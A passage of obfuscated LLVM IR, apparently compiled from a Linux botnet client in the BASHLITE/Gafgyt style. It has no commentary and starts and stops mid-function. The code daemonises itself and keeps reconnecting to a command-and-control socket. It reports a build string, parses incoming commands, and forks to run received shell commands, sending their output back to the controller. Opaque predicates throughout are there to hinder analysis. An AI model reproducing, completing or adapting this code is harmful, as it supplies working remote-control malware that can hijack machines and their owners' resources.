  %93 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  br label %94

; <label>:94:                                     ; preds = %92, %91
  %95 = load i32, i32* @x.87
  %96 = load i32, i32* @y.88
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* @x.87
  %104 = load i32, i32* @y.88
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %111

; <label>:111:                                    ; preds = %originalBBpart28
  br label %114

; <label>:112:                                    ; preds = %originalBBpart24
  %113 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  br label %114

; <label>:114:                                    ; preds = %112, %111
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = call i32 @setsid() #4
  %117 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0)) #4
  %118 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #4
  br label %119

; <label>:119:                                    ; preds = %originalBBpart2157, %122, %115
  %120 = call i32 @initConnection()
  %121 = icmp ne i32 %120, 0
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %119
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.79, i32 0, i32 0))
  %124 = call i32 @sleep(i32 5)
  br label %119

; <label>:125:                                    ; preds = %119
  %126 = load i32, i32* @mainCommSock, align 4
  %127 = call i8* @getBuild()
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %126, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* %127)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %129

; <label>:129:                                    ; preds = %751, %542, %originalBBpart252, %282, %125
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %132 = call i32 @recvLine(i32 %130, i8* %131, i32 4096)
  store i32 %132, i32* %10, align 4
  %133 = icmp ne i32 %132, -1
  br i1 %133, label %134, label %752

; <label>:134:                                    ; preds = %129
  store i32 0, i32* %11, align 4
  br label %135

; <label>:135:                                    ; preds = %270, %134
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = load i64, i64* @numpids, align 8
  %139 = icmp ult i64 %137, %138
  br i1 %139, label %140, label %273

; <label>:140:                                    ; preds = %135
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %11, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i32, i32* %141, i64 %143
  %145 = load i32, i32* %144, align 4
  %146 = call i32 @waitpid(i32 %145, i32* null, i32 1)
  %147 = icmp sgt i32 %146, 0
  br i1 %147, label %148, label %269

; <label>:148:                                    ; preds = %140
  %149 = load i32, i32* %11, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %13, align 4
  br label %151

; <label>:151:                                    ; preds = %originalBBpart227, %148
  %152 = load i32, i32* @x.87
  %153 = load i32, i32* @y.88
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %151
  %160 = load i32, i32* %13, align 4
  %161 = zext i32 %160 to i64
  %162 = load i64, i64* @numpids, align 8
  %163 = icmp ult i64 %161, %162
  %164 = load i32, i32* @x.87
  %165 = load i32, i32* @y.88
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %163, label %172, label %202

; <label>:172:                                    ; preds = %originalBBpart212
  %173 = load i32*, i32** @pids, align 8
  %174 = load i32, i32* %13, align 4
  %175 = zext i32 %174 to i64
  %176 = getelementptr inbounds i32, i32* %173, i64 %175
  %177 = load i32, i32* %176, align 4
  %178 = load i32*, i32** @pids, align 8
  %179 = load i32, i32* %13, align 4
  %180 = sub i32 %179, 1
  %181 = zext i32 %180 to i64
  %182 = getelementptr inbounds i32, i32* %178, i64 %181
  store i32 %177, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %172
  %184 = load i32, i32* @x.87
  %185 = load i32, i32* @y.88
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %183
  %192 = load i32, i32* %13, align 4
  %193 = add i32 %192, 1
  store i32 %193, i32* %13, align 4
  %194 = load i32, i32* @x.87
  %195 = load i32, i32* @y.88
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart227, label %originalBB14alteredBB

originalBBpart227:                                ; preds = %originalBB14
  br label %151

; <label>:202:                                    ; preds = %originalBBpart212
  %203 = load i32*, i32** @pids, align 8
  %204 = load i32, i32* %13, align 4
  %205 = sub i32 %204, 1
  %206 = zext i32 %205 to i64
  %207 = getelementptr inbounds i32, i32* %203, i64 %206
  store i32 0, i32* %207, align 4
  %208 = load i64, i64* @numpids, align 8
  %209 = add i64 %208, -1
  store i64 %209, i64* @numpids, align 8
  %210 = load i64, i64* @numpids, align 8
  %211 = add i64 %210, 1
  %212 = mul i64 %211, 4
  %213 = call noalias i8* @malloc(i64 %212) #4
  %214 = bitcast i8* %213 to i32*
  store i32* %214, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %215

; <label>:215:                                    ; preds = %originalBBpart240, %202
  %216 = load i32, i32* %13, align 4
  %217 = zext i32 %216 to i64
  %218 = load i64, i64* @numpids, align 8
  %219 = icmp ult i64 %217, %218
  br i1 %219, label %220, label %265

; <label>:220:                                    ; preds = %215
  %221 = load i32, i32* @x.87
  %222 = load i32, i32* @y.88
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %220
  %229 = load i32*, i32** @pids, align 8
  %230 = load i32, i32* %13, align 4
  %231 = zext i32 %230 to i64
  %232 = getelementptr inbounds i32, i32* %229, i64 %231
  %233 = load i32, i32* %232, align 4
  %234 = load i32*, i32** %12, align 8
  %235 = load i32, i32* %13, align 4
  %236 = zext i32 %235 to i64
  %237 = getelementptr inbounds i32, i32* %234, i64 %236
  store i32 %233, i32* %237, align 4
  %238 = load i32, i32* @x.87
  %239 = load i32, i32* @y.88
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %246

; <label>:246:                                    ; preds = %originalBBpart231
  %247 = load i32, i32* @x.87
  %248 = load i32, i32* @y.88
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %246
  %255 = load i32, i32* %13, align 4
  %256 = add i32 %255, 1
  store i32 %256, i32* %13, align 4
  %257 = load i32, i32* @x.87
  %258 = load i32, i32* @y.88
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart240, label %originalBB33alteredBB

originalBBpart240:                                ; preds = %originalBB33
  br label %215

; <label>:265:                                    ; preds = %215
  %266 = load i32*, i32** @pids, align 8
  %267 = bitcast i32* %266 to i8*
  call void @free(i8* %267) #4
  %268 = load i32*, i32** %12, align 8
  store i32* %268, i32** @pids, align 8
  br label %269

; <label>:269:                                    ; preds = %265, %140
  br label %270

; <label>:270:                                    ; preds = %269
  %271 = load i32, i32* %11, align 4
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %11, align 4
  br label %135

; <label>:273:                                    ; preds = %135
  %274 = load i32, i32* %10, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %275
  store i8 0, i8* %276, align 1
  %277 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %277)
  %278 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %279 = call i8* @strstr(i8* %278, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %280 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %281 = icmp eq i8* %279, %280
  br i1 %281, label %282, label %285

; <label>:282:                                    ; preds = %273
  %283 = load i32, i32* @mainCommSock, align 4
  %284 = call i32 (i32, i8*, ...) @sockprintf(i32 %283, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i32 0, i32 0))
  br label %129

; <label>:285:                                    ; preds = %273
  %286 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %287 = call i8* @strstr(i8* %286, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0)) #10
  %288 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %289 = icmp eq i8* %287, %288
  br i1 %289, label %290, label %291

; <label>:290:                                    ; preds = %285
  call void @exit(i32 0) #14
  unreachable

; <label>:291:                                    ; preds = %285
  %292 = load i32, i32* @x.87
  %293 = load i32, i32* @y.88
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %291
  %300 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %300, i8** %14, align 8
  %301 = load i8*, i8** %14, align 8
  %302 = load i8, i8* %301, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp eq i32 %303, 33
  %305 = load i32, i32* @x.87
  %306 = load i32, i32* @y.88
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %304, label %313, label %751

; <label>:313:                                    ; preds = %originalBBpart244
  %314 = load i8*, i8** %14, align 8
  %315 = getelementptr inbounds i8, i8* %314, i64 1
  store i8* %315, i8** %15, align 8
  br label %316

; <label>:316:                                    ; preds = %344, %313
  %317 = load i32, i32* @x.87
  %318 = load i32, i32* @y.88
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %316
  %325 = load i8*, i8** %15, align 8
  %326 = load i8, i8* %325, align 1
  %327 = zext i8 %326 to i32
  %328 = icmp ne i32 %327, 32
  %329 = load i32, i32* @x.87
  %330 = load i32, i32* @y.88
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %328, label %337, label %342

; <label>:337:                                    ; preds = %originalBBpart248
  %338 = load i8*, i8** %15, align 8
  %339 = load i8, i8* %338, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp ne i32 %340, 0
  br label %342

; <label>:342:                                    ; preds = %337, %originalBBpart248
  %343 = phi i1 [ false, %originalBBpart248 ], [ %341, %337 ]
  br i1 %343, label %344, label %347

; <label>:344:                                    ; preds = %342
  %345 = load i8*, i8** %15, align 8
  %346 = getelementptr inbounds i8, i8* %345, i32 1
  store i8* %346, i8** %15, align 8
  br label %316

; <label>:347:                                    ; preds = %342
  %348 = load i8*, i8** %15, align 8
  %349 = load i8, i8* %348, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp eq i32 %350, 0
  br i1 %351, label %352, label %369

; <label>:352:                                    ; preds = %347
  %353 = load i32, i32* @x.87
  %354 = load i32, i32* @y.88
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %352
  %361 = load i32, i32* @x.87
  %362 = load i32, i32* @y.88
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %129

; <label>:369:                                    ; preds = %347
  %370 = load i8*, i8** %15, align 8
  store i8 0, i8* %370, align 1
  %371 = load i8*, i8** %14, align 8
  %372 = getelementptr inbounds i8, i8* %371, i64 1
  store i8* %372, i8** %15, align 8
  %373 = load i8*, i8** %14, align 8
  %374 = load i8*, i8** %15, align 8
  %375 = call i64 @strlen(i8* %374) #10
  %376 = getelementptr inbounds i8, i8* %373, i64 %375
  %377 = getelementptr inbounds i8, i8* %376, i64 2
  store i8* %377, i8** %14, align 8
  br label %378

; <label>:378:                                    ; preds = %originalBBpart266, %369
  %379 = load i8*, i8** %14, align 8
  %380 = load i8*, i8** %14, align 8
  %381 = call i64 @strlen(i8* %380) #10
  %382 = sub i64 %381, 1
  %383 = getelementptr inbounds i8, i8* %379, i64 %382
  %384 = load i8, i8* %383, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 10
  br i1 %386, label %396, label %387

; <label>:387:                                    ; preds = %378
  %388 = load i8*, i8** %14, align 8
  %389 = load i8*, i8** %14, align 8
  %390 = call i64 @strlen(i8* %389) #10
  %391 = sub i64 %390, 1
  %392 = getelementptr inbounds i8, i8* %388, i64 %391
  %393 = load i8, i8* %392, align 1
  %394 = zext i8 %393 to i32
  %395 = icmp eq i32 %394, 13
  br label %396

; <label>:396:                                    ; preds = %387, %378
  %397 = phi i1 [ true, %378 ], [ %395, %387 ]
  %398 = load i32, i32* @x.87
  %399 = load i32, i32* @y.88
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %396
  %406 = load i32, i32* @x.87
  %407 = load i32, i32* @y.88
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %397, label %414, label %436

; <label>:414:                                    ; preds = %originalBBpart256
  %415 = load i32, i32* @x.87
  %416 = load i32, i32* @y.88
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %414
  %423 = load i8*, i8** %14, align 8
  %424 = load i8*, i8** %14, align 8
  %425 = call i64 @strlen(i8* %424) #10
  %426 = sub i64 %425, 1
  %427 = getelementptr inbounds i8, i8* %423, i64 %426
  store i8 0, i8* %427, align 1
  %428 = load i32, i32* @x.87
  %429 = load i32, i32* @y.88
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart266, label %originalBB58alteredBB

originalBBpart266:                                ; preds = %originalBB58
  br label %378

; <label>:436:                                    ; preds = %originalBBpart256
  %437 = load i8*, i8** %14, align 8
  store i8* %437, i8** %16, align 8
  br label %438

; <label>:438:                                    ; preds = %originalBBpart274, %436
  %439 = load i32, i32* @x.87
  %440 = load i32, i32* @y.88
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %438
  %447 = load i8*, i8** %14, align 8
  %448 = load i8, i8* %447, align 1
  %449 = zext i8 %448 to i32
  %450 = icmp ne i32 %449, 32
  %451 = load i32, i32* @x.87
  %452 = load i32, i32* @y.88
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %450, label %459, label %464

; <label>:459:                                    ; preds = %originalBBpart270
  %460 = load i8*, i8** %14, align 8
  %461 = load i8, i8* %460, align 1
  %462 = zext i8 %461 to i32
  %463 = icmp ne i32 %462, 0
  br label %464

; <label>:464:                                    ; preds = %459, %originalBBpart270
  %465 = phi i1 [ false, %originalBBpart270 ], [ %463, %459 ]
  br i1 %465, label %466, label %485

; <label>:466:                                    ; preds = %464
  %467 = load i32, i32* @x.87
  %468 = load i32, i32* @y.88
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %466
  %475 = load i8*, i8** %14, align 8
  %476 = getelementptr inbounds i8, i8* %475, i32 1
  store i8* %476, i8** %14, align 8
  %477 = load i32, i32* @x.87
  %478 = load i32, i32* @y.88
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %438

; <label>:485:                                    ; preds = %464
  %486 = load i32, i32* @x.87
  %487 = load i32, i32* @y.88
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %485
  %494 = load i8*, i8** %14, align 8
  store i8 0, i8* %494, align 1
  %495 = load i8*, i8** %14, align 8
  %496 = getelementptr inbounds i8, i8* %495, i32 1
  store i8* %496, i8** %14, align 8
  %497 = load i8*, i8** %16, align 8
  store i8* %497, i8** %17, align 8
  %498 = load i32, i32* @x.87
  %499 = load i32, i32* @y.88
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %506

; <label>:506:                                    ; preds = %510, %originalBBpart278
  %507 = load i8*, i8** %17, align 8
  %508 = load i8, i8* %507, align 1
  %509 = icmp ne i8 %508, 0
  br i1 %509, label %510, label %519

; <label>:510:                                    ; preds = %506
  %511 = load i8*, i8** %17, align 8
  %512 = load i8, i8* %511, align 1
  %513 = zext i8 %512 to i32
  %514 = call i32 @toupper(i32 %513) #10
  %515 = trunc i32 %514 to i8
  %516 = load i8*, i8** %17, align 8
  store i8 %515, i8* %516, align 1
  %517 = load i8*, i8** %17, align 8
  %518 = getelementptr inbounds i8, i8* %517, i32 1
  store i8* %518, i8** %17, align 8
  br label %506

; <label>:519:                                    ; preds = %506
  %520 = load i8*, i8** %16, align 8
  %521 = call i32 @strcmp(i8* %520, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0)) #10
  %522 = icmp eq i32 %521, 0
  br i1 %522, label %523, label %597

; <label>:523:                                    ; preds = %519
  %524 = load i32, i32* @x.87
  %525 = load i32, i32* @y.88
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %523
  %532 = call i32 @listFork()
  %533 = icmp ne i32 %532, 0
  %534 = load i32, i32* @x.87
  %535 = load i32, i32* @y.88
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %533, label %542, label %543

; <label>:542:                                    ; preds = %originalBBpart282
  br label %129

; <label>:543:                                    ; preds = %originalBBpart282
  %544 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %544, i8 0, i64 1024, i32 16, i1 false)
  %545 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %546 = load i8*, i8** %14, align 8
  %547 = call i32 (i8*, i8*, ...) @szprintf(i8* %545, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.84, i32 0, i32 0), i8* %546)
  %548 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %549 = call i32 @fdpopen(i8* %548, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store i32 %549, i32* %19, align 4
  br label %550

; <label>:550:                                    ; preds = %571, %543
  %551 = load i32, i32* @x.87
  %552 = load i32, i32* @y.88
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %550
  %559 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %560 = load i32, i32* %19, align 4
  %561 = call i8* @fdgets(i8* %559, i32 1024, i32 %560)
  %562 = icmp ne i8* %561, null
  %563 = load i32, i32* @x.87
  %564 = load i32, i32* @y.88
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %562, label %571, label %578

; <label>:571:                                    ; preds = %originalBBpart286
  %572 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %572)
  %573 = load i32, i32* @mainCommSock, align 4
  %574 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %575 = call i32 (i32, i8*, ...) @sockprintf(i32 %573, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.85, i32 0, i32 0), i8* %574)
  %576 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %576, i8 0, i64 1024, i32 16, i1 false)
  %577 = call i32 @sleep(i32 1)
  br label %550

; <label>:578:                                    ; preds = %originalBBpart286
  %579 = load i32, i32* @x.87
  %580 = load i32, i32* @y.88
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %578
  %587 = load i32, i32* %19, align 4
  %588 = call i32 @fdpclose(i32 %587)
  call void @exit(i32 0) #14
  %589 = load i32, i32* @x.87
  %590 = load i32, i32* @y.88
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  unreachable

; <label>:597:                                    ; preds = %519
  store i32 1, i32* %21, align 4
  %598 = load i8*, i8** %14, align 8
  %599 = call i8* @strtok(i8* %598, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %599, i8** %22, align 8
  %600 = load i8*, i8** %16, align 8
  %601 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 0
  store i8* %600, i8** %601, align 16
  br label %602

; <label>:602:                                    ; preds = %originalBBpart2135, %597
  %603 = load i32, i32* @x.87
  %604 = load i32, i32* @y.88
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %602
  %611 = load i8*, i8** %22, align 8
  %612 = icmp ne i8* %611, null
  %613 = load i32, i32* @x.87
  %614 = load i32, i32* @y.88
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %612, label %621, label %699

; <label>:621:                                    ; preds = %originalBBpart294
  %622 = load i32, i32* @x.87
  %623 = load i32, i32* @y.88
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %621
  %630 = load i8*, i8** %22, align 8
  %631 = load i8, i8* %630, align 1
  %632 = zext i8 %631 to i32
  %633 = icmp ne i32 %632, 10
  %634 = load i32, i32* @x.87
  %635 = load i32, i32* @y.88
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %633, label %642, label %681

; <label>:642:                                    ; preds = %originalBBpart298
  %643 = load i32, i32* @x.87
  %644 = load i32, i32* @y.88
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %642
  %651 = load i8*, i8** %22, align 8
  %652 = call i64 @strlen(i8* %651) #10
  %653 = add i64 %652, 1
